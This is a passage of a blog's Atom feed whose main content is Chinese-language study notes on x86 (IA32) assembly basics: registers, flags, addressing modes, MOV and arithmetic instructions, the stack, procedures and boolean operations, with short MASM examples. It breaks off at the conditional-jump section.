        &lt;p&gt;从浅至深来记录一下PHP反序列化的知识。本文首发于&lt;a href=&quot;https://xz.aliyun.com/t/3674&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;,转载请注明来源&lt;/p&gt;
&lt;h2 id=&quot;0x00-PHP序列化是什
      
    
    </summary>
    
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>汇编基础</title>
    <link href="https://www.twosmi1e.com/2018/11/30/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.twosmi1e.com/2018/11/30/汇编基础/</id>
    <published>2018-11-30T06:49:56.000Z</published>
    <updated>2018-12-02T15:33:51.092Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-IA32处理器体系结构"><a href="#0x00-IA32处理器体系结构" class="headerlink" title="0x00 IA32处理器体系结构"></a>0x00 IA32处理器体系结构</h2><h3 id="微机的基本结构"><a href="#微机的基本结构" class="headerlink" title="微机的基本结构"></a>微机的基本结构</h3><p><img src="/2018/11/30/汇编基础/1531925594199.png" alt="Alt text"></p><h3 id="指令执行周期"><a href="#指令执行周期" class="headerlink" title="指令执行周期"></a>指令执行周期</h3><p><img src="/2018/11/30/汇编基础/1531926676886.png" alt="Alt text"><br>当指令使用了内存操作数时还需要两个额外的步骤：取操作数和存储输出操作数。<br>机器指令的执行;</p><ol><li>取指令</li><li>解码</li><li>执行</li></ol><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><p><strong>保护模式</strong>：处理器的基本模式。<br><strong>虚拟8086模式</strong>：多任务环境中执行是地址模式的软件。<br><strong>实地址模式</strong>：用于运行那些需要直接访问系统内存和硬件设备的MS-DOS程序。<br>系统管理模式：实现电源管理和系统安全等功能的机制。</p><h3 id="基本执行环境"><a href="#基本执行环境" class="headerlink" title="基本执行环境"></a>基本执行环境</h3><h4 id="基本寄存器"><a href="#基本寄存器" class="headerlink" title="基本寄存器"></a>基本寄存器</h4><p><strong>寄存器中数据在内存中存放数据遵循高高低低的原则</strong></p><p>8个通用寄存器</p><blockquote><p>EAX EBX ECX EDX<br>EBP ESP ESI EDI</p></blockquote><p><img src="/2018/11/30/汇编基础/1543410901257.png" alt="Alt text"></p><p>6个段寄存器<br><img src="/2018/11/30/汇编基础/1543410911229.png" alt="Alt text"></p><p>一个处理器状态标志寄存器(EFLAGS)和一个指令指针(EIP)寄存器。<br><img src="/2018/11/30/汇编基础/1543410921613.png" alt="Alt text"></p><p>ESP：栈地址寄存器  <strong>任意时刻指向栈顶元素</strong><br>EBP：扩展帧指针寄存器 指向堆栈上的函数参数和局部变量<br>EIP：指令指针寄存器<br><strong>EIP寄存器不能作为MOV指令的⽬标操作数</strong></p><p>EFLAGS：由控制CPU的操作或反映CPU某些运算的结果的独立二进制位构成</p><h4 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h4><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center">CF</td><td style="text-align:center">进位标志</td><td style="text-align:center">进位或借位时CF=1</td></tr><tr><td style="text-align:center">AC</td><td style="text-align:center">辅助进位标志</td><td style="text-align:center">低4位进位或借位时A=1</td></tr><tr><td style="text-align:center">PF</td><td style="text-align:center">奇偶标志</td><td style="text-align:center">偶数P=1</td></tr><tr><td style="text-align:center">ZF</td><td style="text-align:center">零标志</td><td style="text-align:center">结果为0则Z=1</td></tr><tr><td style="text-align:center">SF</td><td style="text-align:center">符号标志</td><td style="text-align:center">S = 符号位值（补码时0=正，1=负）</td></tr><tr><td style="text-align:center">OF</td><td style="text-align:center">溢出标志</td><td style="text-align:center">运算结果超界时O=1</td></tr><tr><td style="text-align:center">DF</td><td style="text-align:center">Direction Flag</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">IF</td><td style="text-align:center">Intertupt Flag</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">TF</td><td style="text-align:center">Trace Flag</td></tr></tbody></table><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><h4 id="实地址模式"><a href="#实地址模式" class="headerlink" title="实地址模式"></a>实地址模式</h4><p>可以寻址1MB内存 0~FFFFF</p><h5 id="20位线性地址"><a href="#20位线性地址" class="headerlink" title="20位线性地址"></a>20位线性地址</h5><p>linear address or abssolute address is 20 bits,range from 0 to FFFFF<br>用段-偏移地址表示</p><ul><li>CS：16位代码段</li><li>DS：16位数据段</li><li>SS：16位堆栈段</li><li>ES,FS,GS可指向其他数据段</li></ul><h4 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h4><p>可以寻址4GB内存 0~FFFFFFFF<br>段寄存器指向段描述符表，操作系统使用段描述符表定位程序使用的段的位置。</p><h2 id="0x01-汇编语言基础"><a href="#0x01-汇编语言基础" class="headerlink" title="0x01 汇编语言基础"></a>0x01 汇编语言基础</h2><h3 id="补码的表示法"><a href="#补码的表示法" class="headerlink" title="补码的表示法"></a>补码的表示法</h3><ul><li>正数的补码：与源码相同</li><li>负数的补码：反码加1</li></ul><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p><img src="/2018/11/30/汇编基础/1543413513831.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543413524273.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543414127600.png" alt="Alt text"></p><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><p><strong>16进制数第一个是字母时要在前面加0</strong></p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>一条汇编指令包括4个部分：</p><ul><li>标号（可选）</li><li>助记符</li><li>操作数</li><li>注释(可选)</li></ul><p><img src="/2018/11/30/汇编基础/1543479497975.png" alt="Alt text"></p><h5 id="INVOKE"><a href="#INVOKE" class="headerlink" title="INVOKE"></a>INVOKE</h5><p>相当于call，调用函数或过程</p><h5 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h5><p>伪指令课用于定义变量、宏以及过程，可用于执行命名段以及执行其他与汇编器相关任务。<br><code>.data?</code> :指明未初始化的数据段</p><h5 id="NOP指令"><a href="#NOP指令" class="headerlink" title="NOP指令"></a>NOP指令</h5><p>占用一个字节的存储，什么也不做。</p><h4 id="程序模板"><a href="#程序模板" class="headerlink" title="程序模板"></a>程序模板</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">TITLE</span> Program Template</span><br><span class="line"><span class="comment">; 程序描述：</span></span><br><span class="line"><span class="comment">; 作者：</span></span><br><span class="line"><span class="comment">; 创建日期：</span></span><br><span class="line"><span class="comment">; 修改：</span></span><br><span class="line"><span class="comment">; 日期：  修改者：</span></span><br><span class="line"><span class="symbol">INCLUDE</span> Irvine32.inc</span><br><span class="line"><span class="symbol">.data</span></span><br><span class="line"><span class="comment">;(在此插入变量)</span></span><br><span class="line"><span class="symbol">.code</span></span><br><span class="line"><span class="symbol">main</span> <span class="meta">PROC</span></span><br><span class="line"><span class="comment">;(在此插入可执行代码)</span></span><br><span class="line">exit</span><br><span class="line"><span class="symbol">main</span> <span class="meta">ENDP</span></span><br><span class="line"><span class="comment">;(在此插入其他子程序)</span></span><br><span class="line"><span class="symbol">END</span> main</span><br></pre></td></tr></table></figure><h4 id="汇编-链接-执行"><a href="#汇编-链接-执行" class="headerlink" title="汇编-链接-执行"></a>汇编-链接-执行</h4><p><img src="/2018/11/30/汇编基础/1532701728189.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543480048542.png" alt="Alt text"></p><h3 id="定义数据"><a href="#定义数据" class="headerlink" title="定义数据"></a>定义数据</h3><p>字符常量/字符串常量</p><ul><li>以单引号或双引号括起来的单个/一串字符</li><li>存储为对应字符的ASCII码</li></ul><table><thead><tr><th style="text-align:center">后缀</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">d</td><td style="text-align:center">十进制</td></tr><tr><td style="text-align:center">b</td><td style="text-align:center">二进制</td></tr><tr><td style="text-align:center">q</td><td style="text-align:center">八进制</td></tr><tr><td style="text-align:center">h</td><td style="text-align:center">十六进制</td></tr></tbody></table><h4 id="数据定义语句"><a href="#数据定义语句" class="headerlink" title="数据定义语句"></a>数据定义语句</h4><p>初始值可以用<code>?</code>表示不确定，可以是表达式。<br>可以指定多个初始值，用逗号隔开，变量名代表第一个初始值的偏移。</p><p><code>DUP</code>可以为多个数据项分配存储空间。<br><code>V1 BYTE 10 dup (0)</code>V1占用10个字节空间，初值均为0</p><h4 id="符号常量"><a href="#符号常量" class="headerlink" title="符号常量"></a>符号常量</h4><p>等号伪指令：名字=表达式</p><h5 id="计算数组和字符串大小："><a href="#计算数组和字符串大小：" class="headerlink" title="计算数组和字符串大小："></a>计算数组和字符串大小：</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list <span class="built_in">BYTE</span> <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span></span><br><span class="line">ListSize = ($ - list)</span><br><span class="line"></span><br><span class="line">list <span class="built_in">word</span> <span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span></span><br><span class="line">ListSize = ($-list)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">myString_len = ($ - myString)</span><br></pre></td></tr></table></figure><h5 id="EQU和TEXTEQU伪指令："><a href="#EQU和TEXTEQU伪指令：" class="headerlink" title="EQU和TEXTEQU伪指令："></a>EQU和TEXTEQU伪指令：</h5><p>将符号名和整数表达式，文本联系起来。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name <span class="built_in">EQU</span> expression</span><br><span class="line">name <span class="built_in">EQU</span> symbol</span><br><span class="line">name <span class="built_in">EQU</span> &lt;text&gt;</span><br><span class="line"></span><br><span class="line">rowSize = <span class="number">5</span></span><br><span class="line">count TEXTEQU %(rowSize * <span class="number">5</span>)</span><br><span class="line">move TEXTEQU &lt;<span class="keyword">mov</span>&gt;</span><br><span class="line">setupAL TEXTEQU &lt;move <span class="built_in">al</span>, count&gt;</span><br></pre></td></tr></table></figure></p><p>setupAL将被汇编成mov al, 10</p><h2 id="0x02-数据传送，寻址，算术运算"><a href="#0x02-数据传送，寻址，算术运算" class="headerlink" title="0x02 数据传送，寻址，算术运算"></a>0x02 数据传送，寻址，算术运算</h2><h3 id="小尾（小端）顺序"><a href="#小尾（小端）顺序" class="headerlink" title="小尾（小端）顺序"></a>小尾（小端）顺序</h3><p>intel处理器使用小端顺序存储，<strong>最低字节存储在最低地址单元</strong><br><code>Val DWORD 12345678h</code><br><img src="/2018/11/30/汇编基础/1543490102897.png" alt="Alt text"></p><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><h4 id="操作数类型"><a href="#操作数类型" class="headerlink" title="操作数类型"></a>操作数类型</h4><ul><li>立即操作数(immediate)</li><li>寄存器操作数(register)</li><li>内存操作数(memory)</li></ul><p><strong>MOV指令</strong><br><code>MOV destination, source</code></p><ul><li>两个操作数尺寸必须一致</li><li>不能同时为内存操作数</li><li>目的操作数不能是CS, EIP,IP</li><li>立即数不能直接送至段寄存器</li></ul><p><strong>MOVZX</strong><br>复制较小值至较大值中。<br>低八位原样复制，高八位补0扩展，仅适用于无符号整数。<br><strong>MOVSX</strong><br>低八位原样复制，高八位补F扩展，仅适用于有符号整数。<br><strong>LAHF/SAHF</strong><br><code>LAHF</code>将标志局存起<code>EFLAGS</code>的低8位复制到<code>AH</code>寄存器，<code>SAHF</code>是将<code>AH</code>复制到<code>EFLAGS</code><br><strong>XCHG指令</strong><br>交换两个操作数的内容。<br><code>XCHG reg, reg</code><br><code>XCHG reg, mem</code><br><code>XCHG mem, reg</code></p><h4 id="算数指令"><a href="#算数指令" class="headerlink" title="算数指令"></a>算数指令</h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th><th style="text-align:center">影响标志位</th></tr></thead><tbody><tr><td style="text-align:center">INC</td><td style="text-align:center">加1</td><td style="text-align:center">AF OF PF SF <strong>ZF</strong> 不影响<strong>CF</strong></td></tr><tr><td style="text-align:center">DEC</td><td style="text-align:center">减1</td><td style="text-align:center">AF OF PF SF <strong>ZF</strong> 不影响<strong>CF</strong></td></tr><tr><td style="text-align:center">ADD</td><td style="text-align:center">相加</td><td style="text-align:center"><strong>CF</strong> <strong>ZF</strong> SF OF AF PF</td></tr><tr><td style="text-align:center">SUB</td><td style="text-align:center">相减</td><td style="text-align:center"><strong>CF</strong> <strong>ZF</strong> SF OF AF PF</td></tr><tr><td style="text-align:center">NEG</td><td style="text-align:center">取相反数</td><td style="text-align:center"><strong>CF</strong> <strong>ZF</strong> SF OF AF PF</td></tr></tbody></table><h4 id="加减法影响标志位"><a href="#加减法影响标志位" class="headerlink" title="加减法影响标志位"></a>加减法影响标志位</h4><p>INC和DEC不会影响<code>CF</code>标志位<br><img src="/2018/11/30/汇编基础/1543492944768.png" alt="Alt text"><br>NEG影响的标志位和ADD SUB一样<br><img src="/2018/11/30/汇编基础/1543493668513.png" alt="Alt text"></p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">CF进位位</td><td style="text-align:center">无符号数是无溢出</td></tr><tr><td style="text-align:center">OF溢出位</td><td style="text-align:center">有符号数有无溢出</td></tr><tr><td style="text-align:center">ZF零标位</td><td style="text-align:center">判断结果是否为0</td></tr><tr><td style="text-align:center">SF符号位</td><td style="text-align:center">结果正负</td></tr><tr><td style="text-align:center">PF奇偶标志</td><td style="text-align:center">最低有效字节内1的个数是否为偶数</td></tr><tr><td style="text-align:center">AC辅助进位标志</td><td style="text-align:center">最低有效字节的第三位向高位进位</td></tr></tbody></table><p>加减法算术运算指令的操作数自身不区分有无符号数，程序通过判断不同的标志位来实现对有符号数和无符号数的处理。</p><h4 id="和数据相关的操作符和伪指令"><a href="#和数据相关的操作符和伪指令" class="headerlink" title="和数据相关的操作符和伪指令"></a>和数据相关的操作符和伪指令</h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">OFFSET</td><td style="text-align:center">取偏移地址</td></tr><tr><td style="text-align:center">ALIGN</td><td style="text-align:center">设置对齐值</td></tr><tr><td style="text-align:center">PTR</td><td style="text-align:center">重载默认尺寸</td></tr><tr><td style="text-align:center">TYPE</td><td style="text-align:center">返回单个元素大小</td></tr><tr><td style="text-align:center">LENGTHOF</td><td style="text-align:center">计算数组中元素的数目</td></tr><tr><td style="text-align:center">SIZEOF</td><td style="text-align:center">返回LENGTHOF*TYPE</td></tr><tr><td style="text-align:center">LABEL</td><td style="text-align:center">插入一个标号并赋予尺寸</td></tr></tbody></table><p>加逗号可以多行定义<br><img src="/2018/11/30/汇编基础/1543496755807.png" alt="Alt text"><br>LABEL不会分配存储空间<br><img src="/2018/11/30/汇编基础/1543497296112.png" alt="Alt text"></p><h3 id="JMP和LOOP"><a href="#JMP和LOOP" class="headerlink" title="JMP和LOOP"></a>JMP和LOOP</h3><h4 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h4><p>无条件转移与条件转移<br><img src="/2018/11/30/汇编基础/1543556927203.png" alt="Alt text"><br><code>JMP 目的地址</code><br>功能：接着从目的地址开始执行指令</p><ul><li>目的地址一般为标号</li><li>通常在当前过程内跳转</li></ul><h4 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h4><p><code>LOOP 目的地址</code><br>功能：将<code>ecx</code>的值减1，接着与0比较，如果不等于0，就执行目的地址开始的指令，如果等于0 ，则不跳转，接着执行紧跟在LOOP指令后的指令</p><ul><li>通常，<code>ecx</code>里的值就是<strong>循环次数</strong>。但如果初值为0，因是先减1再判断是否等于0，所以，实际实际循环次数就是<code>1 00 00 00 00 H</code>。</li><li><code>LOOPD</code>也使用ecx控制循环，<code>LOOPW</code>使用cx控制循环。</li><li>实模式下，使用的是cx作为控制循环的寄存器</li></ul><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>数组求和：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">INCLUDE irvine32.inc</span><br><span class="line"><span class="meta">.data</span> </span><br><span class="line">  vb1 <span class="built_in">byte</span>  <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> </span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  main proc</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">esi</span>  , offset vb1</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof vb1</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span>    , <span class="number">0</span> </span><br><span class="line"><span class="symbol">   L1:</span></span><br><span class="line">      <span class="keyword">add</span>  <span class="built_in">al</span>   , [ <span class="built_in">esi</span> ]</span><br><span class="line">      <span class="keyword">add</span>  <span class="built_in">esi</span> , type vb1</span><br><span class="line">      <span class="keyword">loop</span> L1</span><br><span class="line">      exit</span><br><span class="line">  main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure></p><p>复制字符串：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">INCLUDE irvine32.inc</span><br><span class="line"><span class="meta">.data</span> </span><br><span class="line">  s1  <span class="built_in">byte</span>  <span class="string">"source string"</span>,<span class="number">0</span></span><br><span class="line">  s2  <span class="built_in">byte</span> sizeof s1 dup(<span class="number">0</span>) </span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  main proc</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">esi</span> , <span class="number">0</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">ecx</span> , sizeof s1</span><br><span class="line"><span class="symbol">   L1:</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span> , s1[ <span class="built_in">esi</span> ]</span><br><span class="line">      <span class="keyword">mov</span> s2[<span class="built_in">esi</span>] , <span class="built_in">al</span></span><br><span class="line">      <span class="keyword">inc</span> <span class="built_in">esi</span>  </span><br><span class="line">      <span class="keyword">loop</span> L1</span><br><span class="line">      exit</span><br><span class="line">   main endp</span><br><span class="line">End main</span><br></pre></td></tr></table></figure></p><h3 id="寻址方式总结"><a href="#寻址方式总结" class="headerlink" title="寻址方式总结"></a>寻址方式总结</h3><h4 id="操作数寻址方式"><a href="#操作数寻址方式" class="headerlink" title="操作数寻址方式"></a>操作数寻址方式</h4><p> <img src="/2018/11/30/汇编基础/1543558146706.png" alt="Alt text"><br>数据寻址的基本方式：</p><ol><li>立即寻址</li><li>寄存器寻址</li><li>存储器寻址</li></ol><p>存储器寻址有六种类型</p><blockquote><p><img src="/2018/11/30/汇编基础/1543558414467.png" alt="Alt text"></p></blockquote><p>用寄存器作为指针并操纵寄存器的值。操作数使用间接寻址则叫间接操作数。<br><img src="/2018/11/30/汇编基础/1543497840226.png" alt="Alt text|center"><br><img src="/2018/11/30/汇编基础/1543497846254.png" alt="Alt text|center"></p><h2 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h2><h3 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h3><h4 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h4><p>运行时栈是CPU直接管理的内存数组，使用到两个寄存器：SS和ESP</p><ul><li>保护模式下，SS是段选择子，应用程序不应该修改它</li><li>ESP是指向栈的特定位置的一个32位偏移值</li><li>一般不会直接修改ESP，而是通过使用CALL，RET，PUSH，POP等指令，由这些指令间接操作ESP。</li><li>ESP指向最后压入到栈的数据</li><li>实模式下，使用的SS和SP</li></ul><p><strong>PUSH</strong><br><code>PUSH r/m16</code><br><code>PUSH r/m32</code><br><code>PUSH imm32</code></p><p>压栈，将操作数放入堆栈中：</p><ol><li>将ESP减4</li><li>将要压入的32位值拷贝到ESP指向的内存。<br><img src="/2018/11/30/汇编基础/1543559966280.png" alt="Alt text"></li></ol><p>对于32位操作数，ESP减4，存到栈中的内容为双字；对于16位操作数，ESP减2，存到栈中的内容为字<br><strong>POP</strong><br><code>POP r/m16</code><br><code>POP r/m32</code></p><p>出栈，从堆栈中取出操作数放到指令中的操作数中</p><ol><li>将ESP所指向内存中的内容取出放到操作数中</li><li>将ESP加4<br><img src="/2018/11/30/汇编基础/1543560050329.png" alt="Alt text"><br>对于32位操作数，是先从栈中拷贝双字到操作数中，然后ESP加4；对于16位操作数，是先从栈中拷贝字到操作数中，然后ESP加2。</li></ol><p><strong>PUSHFD</strong> 把32位标志寄存器压入堆栈<br><strong>POPFD</strong> 从堆栈中弹出32位值到标志寄存器中<br><strong>两指令无操作数</strong><br>实模式下标志寄存器是16位的，入栈出栈指令分别是PUSHF，POPF。<br><strong>PUSHAD</strong> 把八个32位通用寄存器按序全部压入堆栈<br><strong>POPAD</strong>是以上序反序从堆栈中依次弹出值到八个32位通用寄存器中</p><h3 id="过程定义"><a href="#过程定义" class="headerlink" title="过程定义"></a>过程定义</h3><h4 id="PROC"><a href="#PROC" class="headerlink" title="PROC"></a>PROC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main proc</span><br><span class="line">...</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>一般过程需要返回指令ret，起始过程需要调<code>ExitProcess</code></p><h4 id="CALL和RET"><a href="#CALL和RET" class="headerlink" title="CALL和RET"></a>CALL和RET</h4><p><code>call 过程名</code><br>将EIP压栈（即当前CALL指令的下一条指令的地址），然后将过程名所在地址赋给EIP（相当于跳转到过程名所在的代码处）<br><code>RET</code><br>RET指令是从栈中取出32位地址，赋给EIP。<br><img src="/2018/11/30/汇编基础/1543582686321.png" alt="Alt text"><br>使用寄存器传递过程参数<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span></span><br><span class="line">dArray <span class="built_in">DD</span>  <span class="number">1</span>, <span class="number">2</span> , <span class="number">3</span></span><br><span class="line">dSum  <span class="built_in">DD</span> ?</span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">Main proc</span><br><span class="line">       <span class="keyword">mov</span> <span class="built_in">ebx</span> , offset dArray</span><br><span class="line">       <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof dArray</span><br><span class="line">       <span class="keyword">call</span> SumOf</span><br><span class="line">       <span class="keyword">mov</span> dSum, <span class="built_in">eax</span></span><br><span class="line">       exit</span><br><span class="line">Main endp</span><br><span class="line">SumOf proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span> , <span class="number">0</span> </span><br><span class="line"><span class="symbol">L2:</span> <span class="keyword">add</span> <span class="built_in">eax</span> , [<span class="built_in">ebx</span>]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">ebx</span> , <span class="number">4</span></span><br><span class="line">    <span class="keyword">loop</span> L2</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebx</span>     </span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line">SumOf endp</span><br><span class="line">End main</span><br></pre></td></tr></table></figure></p><h2 id="0x04-条件处理"><a href="#0x04-条件处理" class="headerlink" title="0x04 条件处理"></a>0x04 条件处理</h2><h3 id="布尔和比较指令"><a href="#布尔和比较指令" class="headerlink" title="布尔和比较指令"></a>布尔和比较指令</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">AND</td><td style="text-align:center">与</td></tr><tr><td style="text-align:center">OR</td><td style="text-align:center">或</td></tr><tr><td style="text-align:center">XOR</td><td style="text-align:center">异或</td></tr><tr><td style="text-align:center">NOT</td><td style="text-align:center">非</td></tr><tr><td style="text-align:center">TEST</td><td style="text-align:center">与，不改变目的操作数只改变标志位</td></tr><tr><td style="text-align:center">BT，BTC，BTR，BTS</td><td style="text-align:center">求补/清零/置位</td></tr></tbody></table><p><strong>尺寸相同</strong><br><code>AND</code>, <code>OR</code>,<code>XOR</code>总是清除溢出标志和进位标志(CF和OF)<br><code>NOT</code><strong>不影响任何标志位</strong></p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><h5 id="小写转大写："><a href="#小写转大写：" class="headerlink" title="小写转大写："></a>小写转大写：</h5><p>同一字母的大写字母和小写字母的ASCII码的区别只在第5位不同，其他各位相同，<strong>小写字母第5位为1，大写字母第5位为0</strong><br>如要把小写转大写，则可将小写的ASCII码与<code>11011111B</code>相与<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span></span><br><span class="line">aName <span class="built_in">byte</span> “Abraham” , <span class="number">0</span></span><br><span class="line">nameSize=($-aName)-<span class="number">1</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">Main proc</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">ecx</span> , nameSize</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">esi</span> , <span class="number">0</span></span><br><span class="line"><span class="symbol">L1:</span><span class="keyword">AND</span>  aName[<span class="built_in">esi</span>] , <span class="number">11011111B</span></span><br><span class="line">     <span class="keyword">inc</span> <span class="built_in">esi</span></span><br><span class="line">     <span class="keyword">loop</span> L1</span><br><span class="line">Main endp</span><br><span class="line">End Main</span><br></pre></td></tr></table></figure></p><h5 id="将0-9之间的整数转换为对应数字符号的ASCII码"><a href="#将0-9之间的整数转换为对应数字符号的ASCII码" class="headerlink" title="将0-9之间的整数转换为对应数字符号的ASCII码"></a>将0-9之间的整数转换为对应数字符号的ASCII码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">aNum byte 1,3,2,0</span><br><span class="line">numSize=($-aNum)-1</span><br><span class="line">.code</span><br><span class="line">Main proc</span><br><span class="line">     mov ecx , numSize</span><br><span class="line">     mov esi , 0</span><br><span class="line">L1:OR  aNum[esi] , 110000B</span><br><span class="line">     inc esi</span><br><span class="line">     loop L1</span><br><span class="line">     exit</span><br><span class="line">Main endp</span><br><span class="line">End Main</span><br></pre></td></tr></table></figure><p><strong>CMP</strong><br>功能：对两个操作数作相减运算，不修改操作数，但会影响标志位。会修改OF、SF、ZF、CF、AF、PF。</p><h4 id="设置和清除单个CPU状态标志"><a href="#设置和清除单个CPU状态标志" class="headerlink" title="设置和清除单个CPU状态标志"></a>设置和清除单个CPU状态标志</h4><p><img src="/2018/11/30/汇编基础/1543717974875.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543717989524.png" alt="Alt text"></p><h3 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h3><h4 